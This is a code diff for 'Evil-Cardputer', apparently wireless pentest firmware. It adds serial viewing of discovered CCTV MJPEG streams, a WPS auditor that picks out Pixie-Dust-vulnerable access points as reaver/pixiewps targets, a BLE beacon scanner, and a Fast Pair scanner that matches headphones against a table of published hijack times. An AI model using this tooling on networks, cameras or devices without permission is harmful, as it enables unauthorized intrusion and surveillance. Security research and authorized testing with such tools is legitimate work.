+  preHeader += ",release=v1.5.6"; // Remplacez [release] par la version de l'OS de l'appareil
   preHeader += ",device=Evil-Cardputer"; // Remplacez [device name] par un nom de périphérique, si souhaité
   preHeader += ",display=7h30th3r0n3"; // Ajoutez les caractéristiques d'affichage, si pertinent
   preHeader += ",board=M5Cardputer";
@@ -15085,7 +15458,7 @@ unsigned long lastLog = 0;
 int currentScreen   = 1;  // 1=GeneralInfo, 2=ReceivedData
 
 const String wigleHeaderFileFormat =
-  "WigleWifi-1.4,appRelease=v1.5.5,model=Cardputer,release=v1.5.5,"
+  "WigleWifi-1.4,appRelease=v1.5.6,model=Cardputer,release=v1.5.6,"
   "device=Evil-Cardputer,display=7h30th3r0n3,board=M5Cardputer,brand=M5Stack";
 
 char* log_col_names[LOG_COLUMN_COUNT] = {
@@ -26038,6 +26411,27 @@ bool mjpegViewerFS(const char* url, fs::FS& fs, const char* pathA, const char* p
 }
 
 
+
+// Contrôle série du viewer MJPEG CCTV (portage AtomS3R : mjpeg_list / mjpeg <i>).
+void mjpegSerialList() {
+  if (streamCount() == 0) loadStreamsFromFile(SD, CCTV_LIST_PATH);
+  if (streamCount() == 0) { Serial.println(F("No streams (run 'cctv_scan' or check CCTV list)")); return; }
+  Serial.println(F("=== MJPEG streams ==="));
+  for (int i = 0; i < streamCount(); i++)
+    Serial.printf("%d: %s [%s]\n", i, g_streams[i].name.c_str(), g_streams[i].base.c_str());
+}
+void mjpegSerialView(int idx) {
+  if (streamCount() == 0) loadStreamsFromFile(SD, CCTV_LIST_PATH);
+  if (idx < 0 || idx >= streamCount()) { Serial.println(F("Bad stream index (see 'mjpeg_list')")); return; }
+  g_sel_stream = idx;
+  String url = buildUrl(g_streams[idx], RES_LIST[g_sel_res_idx], g_sel_comp);
+  Serial.printf("[MJPEG] Viewing #%d: %s (send 'back' to exit)\n", idx, url.c_str());
+  if (!SD.exists("/evil/tmp")) SD.mkdir("/evil/tmp");
+  inMenu = false; isOperationInProgress = true;
+  mjpegViewerFS(url.c_str(), SD, "/evil/tmp/mjpeg_a.jpg", "/evil/tmp/mjpeg_b.jpg");
+  isOperationInProgress = false; inMenu = true;
+  Serial.println(F("[MJPEG] Viewer exited"));
+}
 
 void runCCTV_MJPEGViewer() {
   if (WiFi.localIP().toString() == "0.0.0.0") {
@@ -39334,6 +39728,1427 @@ void csiRadarMenu() {
 
 
 // =====================================================================
+// =================== WPS Auditor (Pixie-Dust candidates) =============
+// =====================================================================
+// PASSIVE scanner. Parses the WSC IE (vendor OUI 00:50:F2 type 04) from
+// beacons / probe responses, classifies WPS state, and lists ONLY the
+// attackable targets:
+//   OPEN   = WPS present, configured, NOT locked, PIN method (or unknown)
+//   LIKELY = OPEN and WPS 1.0-only (no Version2 subelement) -> older AP,
+//            statistiquement plus expose au Pixie-Dust (HEURISTIQUE, pas une
+//            certitude : seule l'attaque le prouverait).
+// Non-vulnerable APs (no WPS / locked / PBC-only) are hidden.
+// DETECTION ONLY : l'attaque Pixie-Dust complete (echange WPS registrar brut)
+// n'est pas possible sur l'ESP32-S3 (supplicant IDF = enrollee uniquement).
+// =====================================================================
+#define WPSA_MAX 48
+struct WpsAp {
+  uint8_t  bssid[6];
+  char     ssid[33];
+  int8_t   rssi;
+  uint8_t  channel;
+  bool     wps1only;   // pas de Version2 -> WPS 1.0
+  bool     pinMethod;  // methode PIN presente (sinon inconnue)
+  uint32_t lastSeen;
+};
+static WpsAp        wpsa_list[WPSA_MAX];
+static volatile int wpsa_count = 0;
+static portMUX_TYPE wpsa_mux = portMUX_INITIALIZER_UNLOCKED;
+
+int wpsa_find(const uint8_t* b) {
+  for (int i = 0; i < wpsa_count; i++)
+    if (memcmp(wpsa_list[i].bssid, b, 6) == 0) return i;
+  return -1;
+}
+
+void wpsa_sniffer_cb(void* buf, wifi_promiscuous_pkt_type_t type) {
+  if (type != WIFI_PKT_MGMT) return;
+  const wifi_promiscuous_pkt_t* pkt = (const wifi_promiscuous_pkt_t*)buf;
+  const uint8_t* f = pkt->payload;
+  int len = pkt->rx_ctrl.sig_len;
+  if (len < 38) return;
+  uint16_t fc = f[0] | ((uint16_t)f[1] << 8);
+  uint8_t subtype = (fc & 0xF0) >> 4;
+  if (subtype != 8 && subtype != 5) return;          // beacon(8) / probe-resp(5)
+  const uint8_t* bssid = f + 16;                      // addr3
+
+  char ssid[33] = "";
+  bool wps = false, locked = false, pinM = false, pbc = false, cfgKnown = false;
+  bool ver2 = false;
+  int i = 36;                                         // IEs after mgmt hdr(24)+fixed(12)
+  while (i + 2 <= len) {
+    uint8_t id = f[i], l = f[i + 1];
+    if (i + 2 + l > len) break;
+    const uint8_t* d = f + i + 2;
+    if (id == 0) {                                    // SSID
+      uint8_t sl = l > 32 ? 32 : l;
+      memcpy(ssid, d, sl); ssid[sl] = 0;
+    } else if (id == 221 && l >= 4 &&
+               d[0] == 0x00 && d[1] == 0x50 && d[2] == 0xF2 && d[3] == 0x04) {
+      wps = true;
+      int j = 4;
+      while (j + 4 <= l) {                            // WSC attrs: 2B id, 2B len (BE)
+        uint16_t aid  = ((uint16_t)d[j] << 8) | d[j + 1];
+        uint16_t alen = ((uint16_t)d[j + 2] << 8) | d[j + 3];
+        if (j + 4 + alen > l) break;
+        const uint8_t* av = d + j + 4;
+        if (aid == 0x1057 && alen >= 1) locked = (av[0] == 1);           // AP Setup Locked
+        else if ((aid == 0x1008 || aid == 0x1053) && alen >= 2) {        // Config Methods
+          uint16_t cm = ((uint16_t)av[0] << 8) | av[1];
+          cfgKnown = true;
+          pbc  = (cm & (0x0080 | 0x0280 | 0x0480)) != 0;
+          pinM = (cm & (0x0004 | 0x0008 | 0x0100)) != 0;
+        } else if (aid == 0x1049 && alen >= 4 &&                          // Vendor Extension
+                   av[0] == 0x00 && av[1] == 0x37 && av[2] == 0x2A) {     // WFA vendor id
+          uint16_t k = 3;
+          while (k + 2 <= alen) {                                        // subelems: 1B id,1B len
+            uint8_t sid = av[k], slen = av[k + 1];
+            if (k + 2 + slen > alen) break;
+            if (sid == 0x00) ver2 = true;                                // Version2 present
+            k += 2 + slen;
+          }
+        }
+        j += 4 + alen;
+      }
+    }
+    i += 2 + l;
+  }
+  if (!wps) return;
+  // HAUTE CONFIANCE : on exige d'AVOIR OBSERVE la methode PIN (Config Methods,
+  // presente de facon fiable dans les probe responses) ET de ne PAS avoir vu
+  // locked. Toute supposition est rejetee -> quasi zero faux positif (au prix
+  // de rater les APs qui n'exposent pas leurs Config Methods).
+  (void)pbc;
+  if (!cfgKnown || !pinM) return;   // methode PIN non confirmee -> ignore
+  if (locked) return;               // verrouille -> ignore
+
+  portENTER_CRITICAL(&wpsa_mux);
+  int idx = wpsa_find(bssid);
+  if (idx < 0 && wpsa_count < WPSA_MAX) { idx = wpsa_count++; memcpy(wpsa_list[idx].bssid, bssid, 6); }
+  if (idx >= 0) {
+    if (ssid[0]) memcpy(wpsa_list[idx].ssid, ssid, 33); // garder un bon SSID
+    wpsa_list[idx].rssi     = pkt->rx_ctrl.rssi;
+    wpsa_list[idx].channel  = pkt->rx_ctrl.channel;
+    wpsa_list[idx].wps1only = !ver2;
+    wpsa_list[idx].pinMethod = true; // confirme (cfgKnown && pinM garantis ci-dessus)
+    wpsa_list[idx].lastSeen = millis();
+  }
+  portEXIT_CRITICAL(&wpsa_mux);
+}
+
+void wpsa_draw(M5Canvas* sprite, bool use_sprite, int sel, int top, uint8_t ch) {
+  LovyanGFX& sp = use_sprite ? (LovyanGFX&)*sprite : (LovyanGFX&)M5.Display;
+  const int W = 240, H = 135;
+  uint16_t orange = sp.color565(255, 140, 0);
+  WpsAp snap[WPSA_MAX]; int cnt;
+  portENTER_CRITICAL(&wpsa_mux);
+  cnt = wpsa_count; for (int i = 0; i < cnt; i++) snap[i] = wpsa_list[i];
+  portEXIT_CRITICAL(&wpsa_mux);
+
+  sp.fillScreen(TFT_BLACK);
+  sp.fillRect(0, 0, W, 16, 0x0841);
+  sp.drawFastHLine(0, 16, W, orange);
+  sp.setTextFont(1); sp.setTextSize(1.5);
+  sp.setTextColor(orange, 0x0841);
+  sp.setCursor(4, 2); sp.printf("WPS Auditor  ch%-2d  %d", ch, cnt);
+  sp.setTextSize(1);
+
+  int y = 20; const int maxVis = 8;
+  for (int oi = top; oi < cnt && oi < top + maxVis; oi++) {
+    WpsAp& a = snap[oi];
+    bool sel_ = (oi == sel);
+    if (sel_) sp.fillRect(0, y, W, 12, TFT_NAVY);
+    // rouge = OPEN (WPS-PIN), orange = LIKELY (WPS1.0-only)
+    uint16_t fg = a.wps1only ? orange : TFT_RED;
+    sp.setTextColor(sel_ ? TFT_WHITE : fg);
+    sp.setCursor(2, y + 2);
+    sp.printf("%02X%02X%02X %-9.9s c%-2d%4d %s",
+              a.bssid[3], a.bssid[4], a.bssid[5], a.ssid[0] ? a.ssid : "(hidden)",
+              a.channel, a.rssi, a.wps1only ? "LIKELY" : "OPEN");
+    y += 12;
+  }
+  if (cnt == 0) {
+    sp.setTextColor(TFT_YELLOW); sp.setCursor(10, 60);
+    sp.print("Scanning WPS APs (ch hop)...");
+  }
+  sp.fillRect(0, H - 12, W, 12, 0x0841);
+  sp.setTextColor(0x5AEB); sp.setCursor(2, H - 10);
+  sp.print("ENTER=detail  RED=OPEN ORANGE=WPS1.0  BKSP=exit");
+  if (use_sprite) sprite->pushSprite(0, 0);
+}
+
+void wpsa_detail(M5Canvas* sprite, bool use_sprite, int sel) {
+  WpsAp a; bool ok=false;
+  portENTER_CRITICAL(&wpsa_mux);
+  if (sel >= 0 && sel < wpsa_count) { a = wpsa_list[sel]; ok = true; }
+  portEXIT_CRITICAL(&wpsa_mux);
+  if (!ok) return;
+  LovyanGFX& sp = use_sprite ? (LovyanGFX&)*sprite : (LovyanGFX&)M5.Display;
+  uint16_t orange = sp.color565(255, 140, 0);
+  sp.fillScreen(TFT_BLACK);
+  sp.setTextFont(1); sp.setTextSize(1.5);
+  sp.setTextColor(a.wps1only ? orange : TFT_RED);
+  sp.setCursor(4, 2); sp.print(a.wps1only ? "LIKELY (WPS1.0)" : "OPEN (WPS-PIN)");
+  sp.setTextSize(1); sp.setTextColor(TFT_WHITE);
+  int y = 24;
+  sp.setCursor(4, y); sp.printf("SSID : %s", a.ssid[0] ? a.ssid : "(hidden)"); y += 14;
+  sp.setCursor(4, y); sp.printf("BSSID: %02X:%02X:%02X:%02X:%02X:%02X",
+      a.bssid[0],a.bssid[1],a.bssid[2],a.bssid[3],a.bssid[4],a.bssid[5]); y += 14;
+  sp.setCursor(4, y); sp.printf("Channel : %d", a.channel); y += 14;
+  sp.setCursor(4, y); sp.printf("RSSI : %d dBm", a.rssi); y += 14;
+  sp.setCursor(4, y); sp.printf("WPS : %s, PIN confirme", a.wps1only ? "1.0" : "2.0"); y += 14;
+  sp.setTextColor(0x5AEB); sp.setCursor(4, 122); sp.print("Cible reaver/pixiewps = BSSID  BKSP=back");
+  if (use_sprite) sprite->pushSprite(0, 0);
+  enterDebounce();
+  while (true) { M5.update(); cardUpdate(); if (kp(KEY_BACKSPACE) || kp(KEY_ENTER)) { keyRelease(); break; } delay(15); }
+}
+
+void wpsAuditorMenu() {
+  keyRelease();
+  M5Canvas* sprite = new (std::nothrow) M5Canvas(&M5.Display);
+  bool use_sprite = false;
+  if (sprite) { sprite->setColorDepth(8); use_sprite = sprite->createSprite(240, 135); }
+
+  portENTER_CRITICAL(&wpsa_mux); wpsa_count = 0; portEXIT_CRITICAL(&wpsa_mux);
+
+  WiFi.mode(WIFI_STA);
+  esp_wifi_start();
+  delay(50);
+  esp_wifi_set_promiscuous(false);
+  esp_wifi_set_promiscuous_rx_cb(wpsa_sniffer_cb);
+  esp_wifi_set_promiscuous(true);
+  uint8_t ch = 1;
+  esp_wifi_set_channel(ch, WIFI_SECOND_CHAN_NONE);
+
+  int sel = 0, top = 0;
+  uint32_t lastDraw = 0, lastHop = millis();
+  enterDebounce();
+
+  while (true) {
+    M5.update(); cardUpdate();
+    if (kp(KEY_BACKSPACE)) { keyRelease(); break; }
+
+    int cnt; portENTER_CRITICAL(&wpsa_mux); cnt = wpsa_count; portEXIT_CRITICAL(&wpsa_mux);
+    if (kp('.') && cnt > 0)      { keyRelease(); sel = (sel + 1) % cnt; lastDraw = 0; }
+    else if (kp(';') && cnt > 0) { keyRelease(); sel = (sel - 1 + cnt) % cnt; lastDraw = 0; }
+    if (kp(KEY_ENTER) && cnt > 0)  { keyRelease(); wpsa_detail(sprite, use_sprite, sel); lastDraw = 0; }
+    if (sel < top) top = sel;
+    if (sel >= top + 8) top = sel - 7;
+
+    if (millis() - lastHop > 320) {                    // channel hopping 1..13
+      lastHop = millis();
+      ch = (ch % 13) + 1;
+      esp_wifi_set_channel(ch, WIFI_SECOND_CHAN_NONE);
+      delay(4);
+      sendProbeRequest("");                                // force les probe responses
+      delay(4);
+      sendProbeRequest("");
+    }
+    if (millis() - lastDraw > 400) { lastDraw = millis(); wpsa_draw(sprite, use_sprite, sel, top, ch); }
+    delay(10);
+  }
+
+  esp_wifi_set_promiscuous(false);
+  esp_wifi_set_promiscuous_rx_cb(NULL);
+  WiFi.mode(WIFI_OFF);
+  if (sprite) { sprite->deleteSprite(); delete sprite; }
+  waitAndReturnToMenu("WPS Auditor stopped");
+}
+// =================== WPS Auditor end ================================
+
+// =================== BLE Beacon Scanner (iBeacon / Eddystone) =========
+// =====================================================================
+// PASSIF : lit les advertisements BLE broadcast (non-connectable), decode
+// iBeacon (ManufData Apple 0x004C type 0x02) et Eddystone (service 0xFEAA :
+// frames UID / URL / TLM / EID). Aucune connexion, aucune emission -> recon
+// non-intrusif. Rappel : plus aucun pop-up "appless" en 2026 (iOS jamais,
+// Android arrete fin 2018) ; on lit juste ce qui est crie en clair.
+// =====================================================================
+static BLEUUID BCN_EDDY_UUID((uint16_t)0xFEAA);
+
+enum { BCN_IBEACON = 0, BCN_UID, BCN_URL, BCN_TLM, BCN_EID };
+struct BcnEntry {
+  uint8_t  mac[6];
+  int      rssi;
+  uint8_t  type;
+  uint8_t  uuid[16];              // iBeacon proximity UUID
+  uint16_t major, minor;
+  int8_t   txp;
+  uint8_t  ns[10];               // Eddystone-UID namespace
+  uint8_t  inst[6];              // Eddystone-UID instance
+  char     url[48];              // Eddystone-URL
+  uint16_t battmv;               // Eddystone-TLM
+  float    tempC;
+  uint32_t advcnt;
+  uint32_t lastSeen;
+};
+#define BCN_MAX 40
+static BcnEntry     bcn_list[BCN_MAX];
+static volatile int bcn_count = 0;
+static portMUX_TYPE bcn_mux = portMUX_INITIALIZER_UNLOCKED;
+
+int bcn_find(const uint8_t* mac, uint8_t type) {
+  for (int i = 0; i < bcn_count; i++)
+    if (bcn_list[i].type == type && memcmp(bcn_list[i].mac, mac, 6) == 0) return i;
+  return -1;
+}
+
+void bcn_url_decode(const uint8_t* d, int len, char* out, int outsz) {
+  static const char* SCHEME[] = { "http://www.", "https://www.", "http://", "https://" };
+  static const char* SUF[]    = { ".com/", ".org/", ".edu/", ".net/", ".info/", ".biz/", ".gov/",
+                                  ".com",  ".org",  ".edu",  ".net",  ".info",  ".biz",  ".gov" };
+  int o = 0;
+  if (len < 1) { out[0] = 0; return; }
+  uint8_t sc = d[0];
+  if (sc < 4) { const char* p = SCHEME[sc]; while (*p && o < outsz - 1) out[o++] = *p++; }
+  for (int i = 1; i < len && o < outsz - 1; i++) {
+    uint8_t c = d[i];
+    if (c < 14) { const char* p = SUF[c]; while (*p && o < outsz - 1) out[o++] = *p++; }
+    else if (c >= 0x20 && c < 0x7f) out[o++] = (char)c;
+  }
+  out[o] = 0;
+}
+
+class BcnScanCallbacks : public BLEAdvertisedDeviceCallbacks {
+public:
+  void onResult(BLEAdvertisedDevice dev) override {
+    BcnEntry e = {};
+    bool found = false;
+    memcpy(e.mac, dev.getAddress().getNative(), 6);
+    e.rssi = dev.getRSSI();
+
+    // --- iBeacon (ManufData 4C 00 02 15 ...) ---
+    if (dev.haveManufacturerData()) {
+      std::string m = dev.getManufacturerData();
+      if (m.size() >= 25 && (uint8_t)m[0] == 0x4C && (uint8_t)m[1] == 0x00 &&
+          (uint8_t)m[2] == 0x02 && (uint8_t)m[3] == 0x15) {
+        e.type = BCN_IBEACON;
+        memcpy(e.uuid, m.data() + 4, 16);
+        e.major = ((uint16_t)(uint8_t)m[20] << 8) | (uint8_t)m[21];
+        e.minor = ((uint16_t)(uint8_t)m[22] << 8) | (uint8_t)m[23];
+        e.txp   = (int8_t)m[24];
+        found = true;
+      }
+    }
+
+    // --- Eddystone (service data 0xFEAA) ---
+    if (!found) {
+      int n = dev.getServiceDataCount();
+      for (int i = 0; i < n; i++) {
+        if (!dev.getServiceDataUUID(i).equals(BCN_EDDY_UUID)) continue;
+        std::string sd = dev.getServiceData(i);
+        if (sd.size() < 1) break;
+        uint8_t ft = (uint8_t)sd[0];
+        const uint8_t* d = (const uint8_t*)sd.data();
+        int len = sd.size();
+        if (ft == 0x00 && len >= 18) {              // UID
+          e.type = BCN_UID; memcpy(e.ns, d + 2, 10); memcpy(e.inst, d + 12, 6);
+          e.txp = (int8_t)d[1]; found = true;
+        } else if (ft == 0x10 && len >= 3) {         // URL
+          e.type = BCN_URL; e.txp = (int8_t)d[1];
+          bcn_url_decode(d + 2, len - 2, e.url, sizeof(e.url)); found = true;
+        } else if (ft == 0x20 && len >= 14) {        // TLM
+          e.type = BCN_TLM;
+          e.battmv = ((uint16_t)d[2] << 8) | d[3];
+          e.tempC  = (float)((int16_t)(((uint16_t)d[4] << 8) | d[5])) / 256.0f;
+          e.advcnt = ((uint32_t)d[6] << 24) | ((uint32_t)d[7] << 16) | ((uint32_t)d[8] << 8) | d[9];
+          found = true;
+        } else if (ft == 0x30 && len >= 10) {        // EID
+          e.type = BCN_EID; e.txp = (int8_t)d[1]; memcpy(e.inst, d + 2, 6); found = true;
+        }
+        break;
+      }
+    }
+    if (!found) return;
+
+    e.lastSeen = millis();
+    portENTER_CRITICAL(&bcn_mux);
+    int idx = bcn_find(e.mac, e.type);
+    if (idx < 0 && bcn_count < BCN_MAX) idx = bcn_count++;
+    if (idx >= 0) bcn_list[idx] = e;
+    portEXIT_CRITICAL(&bcn_mux);
+  }
+};
+static BcnScanCallbacks bcn_scan_cb;
+
+const char* bcn_type_str(uint8_t t) {
+  switch (t) { case BCN_IBEACON: return "iBcn"; case BCN_UID: return "eUID";
+    case BCN_URL: return "eURL"; case BCN_TLM: return "eTLM"; default: return "eEID"; }
+}
+
+void bcn_draw(M5Canvas* sprite, bool use_sprite, int sel, int top) {
+  LovyanGFX& sp = use_sprite ? (LovyanGFX&)*sprite : (LovyanGFX&)M5.Display;
+  const int W = 240, H = 135;
+  uint16_t cyan = sp.color565(0, 200, 220);
+  BcnEntry snap[BCN_MAX]; int cnt;
+  portENTER_CRITICAL(&bcn_mux);
+  cnt = bcn_count; for (int i = 0; i < cnt; i++) snap[i] = bcn_list[i];
+  portEXIT_CRITICAL(&bcn_mux);
+
+  sp.fillScreen(TFT_BLACK);
+  sp.fillRect(0, 0, W, 16, 0x0841);
+  sp.drawFastHLine(0, 16, W, cyan);
+  sp.setTextFont(1); sp.setTextSize(1.5);
+  sp.setTextColor(cyan, 0x0841);
+  sp.setCursor(4, 2); sp.printf("Beacon Scan  %d", cnt);
+  sp.setTextSize(1);
+
+  int y = 20; const int maxVis = 9;
+  for (int oi = top; oi < cnt && oi < top + maxVis; oi++) {
+    BcnEntry& b = snap[oi];
+    bool s_ = (oi == sel);
+    if (s_) sp.fillRect(0, y, W, 12, TFT_NAVY);
+    sp.setTextColor(s_ ? TFT_WHITE : cyan);
+    sp.setCursor(2, y + 2);
+    char info[40];
+    if (b.type == BCN_IBEACON)
+      snprintf(info, sizeof(info), "%02X%02X..%02X%02X M%u m%u",
+               b.uuid[0], b.uuid[1], b.uuid[14], b.uuid[15], b.major, b.minor);
+    else if (b.type == BCN_URL)
+      snprintf(info, sizeof(info), "%.30s", b.url);
+    else if (b.type == BCN_UID)
+      snprintf(info, sizeof(info), "%02X%02X%02X%02X%02X..%02X%02X",
+               b.ns[0], b.ns[1], b.ns[2], b.ns[3], b.ns[4], b.inst[4], b.inst[5]);
+    else if (b.type == BCN_TLM)
+      snprintf(info, sizeof(info), "%umV %.1fC #%lu", b.battmv, b.tempC, (unsigned long)b.advcnt);
+    else
+      snprintf(info, sizeof(info), "%02X%02X%02X%02X%02X%02X", b.inst[0], b.inst[1], b.inst[2], b.inst[3], b.inst[4], b.inst[5]);
+    sp.printf("%s %4d %s", bcn_type_str(b.type), b.rssi, info);
+    y += 12;
+  }
+  if (cnt == 0) { sp.setTextColor(TFT_YELLOW); sp.setCursor(10, 60); sp.print("Scanning beacons..."); }
+  sp.fillRect(0, H - 12, W, 12, 0x0841);
+  sp.setTextColor(0x5AEB); sp.setCursor(2, H - 10);
+  sp.print("ENTER=detail  ;/. select  BKSP=exit");
+  if (use_sprite) sprite->pushSprite(0, 0);
+}
+
+void bcn_detail(M5Canvas* sprite, bool use_sprite, int sel) {
+  BcnEntry b; bool ok = false;
+  portENTER_CRITICAL(&bcn_mux);
+  if (sel >= 0 && sel < bcn_count) { b = bcn_list[sel]; ok = true; }
+  portEXIT_CRITICAL(&bcn_mux);
+  if (!ok) return;
+  LovyanGFX& sp = use_sprite ? (LovyanGFX&)*sprite : (LovyanGFX&)M5.Display;
+  uint16_t cyan = sp.color565(0, 200, 220);
+  sp.fillScreen(TFT_BLACK);
+  sp.setTextFont(1); sp.setTextSize(1.5); sp.setTextColor(cyan);
+  sp.setCursor(4, 2); sp.printf("%s beacon", bcn_type_str(b.type));
+  sp.setTextSize(1); sp.setTextColor(TFT_WHITE);
+  int y = 22;
+  sp.setCursor(4, y); sp.printf("MAC %02X:%02X:%02X:%02X:%02X:%02X  %ddBm",
+      b.mac[0],b.mac[1],b.mac[2],b.mac[3],b.mac[4],b.mac[5], b.rssi); y += 13;
+  if (b.type == BCN_IBEACON) {
+    sp.setCursor(4, y); sp.print("UUID:"); y += 11;
+    char u[40]; for (int i=0;i<16;i++) snprintf(u+i*2,3,"%02X",b.uuid[i]);
+    sp.setCursor(8, y); sp.printf("%.16s", u); y += 11;
+    sp.setCursor(8, y); sp.printf("%.16s", u+16); y += 13;
+    sp.setCursor(4, y); sp.printf("major %u  minor %u  txp %d", b.major, b.minor, b.txp);
+  } else if (b.type == BCN_URL) {
+    sp.setCursor(4, y); sp.print("URL:"); y += 11;
+    sp.setCursor(8, y); sp.printf("%.36s", b.url);
+  } else if (b.type == BCN_UID) {
+    sp.setCursor(4, y); sp.print("Namespace:"); y += 11;
+    char ns[24]; for (int i=0;i<10;i++) snprintf(ns+i*2,3,"%02X",b.ns[i]);
+    sp.setCursor(8, y); sp.printf("%s", ns); y += 13;
+    sp.setCursor(4, y); sp.print("Instance:"); y += 11;
+    char in[16]; for (int i=0;i<6;i++) snprintf(in+i*2,3,"%02X",b.inst[i]);
+    sp.setCursor(8, y); sp.printf("%s", in);
+  } else if (b.type == BCN_TLM) {
+    sp.setCursor(4, y); sp.printf("Battery: %u mV", b.battmv); y += 13;
+    sp.setCursor(4, y); sp.printf("Temp: %.1f C", b.tempC); y += 13;
+    sp.setCursor(4, y); sp.printf("Adv count: %lu", (unsigned long)b.advcnt);
+  } else {
+    sp.setCursor(4, y); sp.print("Ephemeral ID (rotating):"); y += 11;
+    char in[16]; for (int i=0;i<6;i++) snprintf(in+i*2,3,"%02X",b.inst[i]);
+    sp.setCursor(8, y); sp.printf("%s", in);
+  }
+  sp.setTextColor(0x5AEB); sp.setCursor(4, 124); sp.print("BKSP=back");
+  if (use_sprite) sprite->pushSprite(0, 0);
+  enterDebounce();
+  while (true) { M5.update(); cardUpdate(); if (kp(KEY_BACKSPACE) || kp(KEY_ENTER)) { keyRelease(); break; } delay(15); }
+}
+
+void beaconScanMenu() {
+  keyRelease();
+  M5Canvas* sprite = new (std::nothrow) M5Canvas(&M5.Display);
+  bool use_sprite = false;
+  if (sprite) { sprite->setColorDepth(8); use_sprite = sprite->createSprite(240, 135); }
+
+  WiFi.mode(WIFI_OFF);
+  delay(50);
+  if (!BLEDevice::getInitialized()) BLEDevice::init("");
+  isBLEInitialized = true;
+
+  portENTER_CRITICAL(&bcn_mux); bcn_count = 0; portEXIT_CRITICAL(&bcn_mux);
+
+  BLEScan* scan = BLEDevice::getScan();
+  scan->stop();
+  scan->clearResults();
+  scan->setAdvertisedDeviceCallbacks(&bcn_scan_cb, true);
+  scan->setActiveScan(true);
+  scan->setInterval(160);
+  scan->setWindow(160);
+  scan->start(0, nullptr, false);
+
+  int sel = 0, top = 0;
+  uint32_t lastDraw = 0;
+  enterDebounce();
+  while (true) {
+    M5.update(); cardUpdate();
+    if (kp(KEY_BACKSPACE)) { keyRelease(); break; }
+    int cnt; portENTER_CRITICAL(&bcn_mux); cnt = bcn_count; portEXIT_CRITICAL(&bcn_mux);
+    if (kp('.') && cnt > 0)      { keyRelease(); sel = (sel + 1) % cnt; lastDraw = 0; }
+    else if (kp(';') && cnt > 0) { keyRelease(); sel = (sel - 1 + cnt) % cnt; lastDraw = 0; }
+    if (kp(KEY_ENTER) && cnt > 0){ keyRelease(); bcn_detail(sprite, use_sprite, sel); lastDraw = 0; }
+    if (sel < top) top = sel;
+    if (sel >= top + 9) top = sel - 8;
+    if (millis() - lastDraw > 400) { lastDraw = millis(); bcn_draw(sprite, use_sprite, sel, top); }
+    delay(15);
+  }
+  scan->stop();
+  scan->setAdvertisedDeviceCallbacks(nullptr);
+  scan->clearResults();
+  if (sprite) { sprite->deleteSprite(); delete sprite; }
+  releaseBLE();
+  waitAndReturnToMenu("Beacon Scan stopped");
+}
+// =================== BLE Beacon Scanner end ==========================
+
+// =================== WhisperPair Fast Pair Scanner ==================
+// =====================================================================
+// BLE-only scanner / identifier for Google Fast Pair devices listed in the
+// WhisperPair research results (KU Leuven COSIC, 2025). The ESP32-S3 has BLE
+// only (no BR/EDR), so we scan for Fast Pair service 0xFE2C, obtain the 3-byte
+// Model ID (from advertisement service-data when the target is discoverable,
+// or via a GATT read otherwise) and classify it against the published table.
+// The BR/EDR portion of the research (audio capture/replay) is out of scope
+// and not possible on this chip; this tool identifies and flags targets only.
+
+static BLEUUID WP_SVC_UUID((uint16_t)0xFE2C);
+static BLEUUID WP_CHAR_MODELID("FE2C1233-8366-4814-8EB0-01DE32100BEA");
+
+enum WpNonce : uint8_t { WP_N_NO = 0, WP_N_SESSION = 1, WP_N_YES = 2 };
+
+struct WpKnown {
+  uint32_t    modelId;   // decimal Fast Pair model identifier (3-byte value)
+  const char* name;
+  bool        affected;
+  uint8_t     nonce;     // WpNonce
+  const char* hijack;    // measured time from the paper, "-" when N/A
+};
+
+// Published WhisperPair results table (25 tested devices).
+static const WpKnown WP_DB[] = {
+  {  6980580, "Beats Solo Buds",        false, WP_N_YES,     "-"     },
+  { 12934265, "Pixel Buds Pro 2",       true,  WP_N_NO,      "6.89s" },
+  {  3778746, "Jabra Elite 8 Active",   true,  WP_N_NO,      "32.0s" },
+  {  3293323, "JBL Tune Beam",          true,  WP_N_SESSION, "6.91s" },
+  { 15473012, "Marshall MOTIF II ANC",  true,  WP_N_YES,     "9.49s" },
+  {  8625818, "Nothing Ear (a)",        true,  WP_N_SESSION, "38.8s" },
+  { 13394952, "OnePlus Nord BudsPro3",  true,  WP_N_SESSION, "10.2s" },
+  { 15984097, "HP Poly VFree 60",       false, WP_N_NO,      "-"     },
+  { 11155060, "Redmi Buds 5 Pro",       true,  WP_N_SESSION, "8.32s" },
+  {  5409858, "Soundcore Liberty 4NC",  true,  WP_N_YES,     "15.3s" },
+  { 12499626, "Sony WF-1000XM5",        true,  WP_N_YES,     "9.43s" },
+  { 13285048, "Audio-Tech ATH-M20xBT",  false, WP_N_SESSION, "-"     },
+  {  5723549, "Bose QC Ultra",          false, WP_N_NO,      "-"     },
+  { 14502233, "JBL Live 775 NC",        true,  WP_N_SESSION, "7.62s" },
+  { 12915160, "Marshall Major V",       true,  WP_N_SESSION, "11.7s" },
+  {  7340495, "Sonos Ace V",            false, WP_N_NO,      "-"     },
+  { 13386638, "Sony WH-1000XM4",        true,  WP_N_YES,     "9.69s" },
+  { 13911719, "Sony WH-1000XM5",        true,  WP_N_YES,     "12.4s" },
+  {  6360443, "Sony WH-1000XM6",        true,  WP_N_SESSION, "12.9s" },
+  { 16003068, "Sony WH-CH720N",         true,  WP_N_YES,     "7.46s" },
+  {  2431472, "B&O Beosound A1",        false, WP_N_NO,      "-"     },
+  {  9888885, "Jabra Speak2 55 UC",     false, WP_N_NO,      "-"     },
+  {  1917389, "JBL Clip 5",             true,  WP_N_YES,     "36.2s" },
+  {  7278954, "JBL Flip 6",             false, WP_N_NO,      "-"     },
+  { 11575855, "Logitech Wonderboom 4",  true,  WP_N_SESSION, "11.9s" },
+};
+static const int WP_DB_COUNT = sizeof(WP_DB) / sizeof(WP_DB[0]);
+
+// Returns index into WP_DB, or -1 if unknown. (Returns int rather than a
+// WpKnown* so the Arduino auto-generated prototype does not reference a type
+// declared later than the top-of-file prototype block.)
+int wp_lookup(uint32_t modelId) {
+  for (int i = 0; i < WP_DB_COUNT; i++) {
+    if (WP_DB[i].modelId == modelId) return i;
+  }
+  return -1;
+}
+#define WP_MAX_RESULTS 30
+struct WpResult {
+  uint8_t             mac[6];
+  esp_ble_addr_type_t atype;
+  int                 rssi;
+  uint32_t            modelId;    // 0 when unknown / hidden
+  bool                hasModelId;
+  uint32_t            lastSeen;
+};
+
+static WpResult      wp_results[WP_MAX_RESULTS];
+static volatile int  wp_result_count = 0;
+static portMUX_TYPE  wp_mux = portMUX_INITIALIZER_UNLOCKED;
+
+int wp_find_result(const uint8_t* mac) {
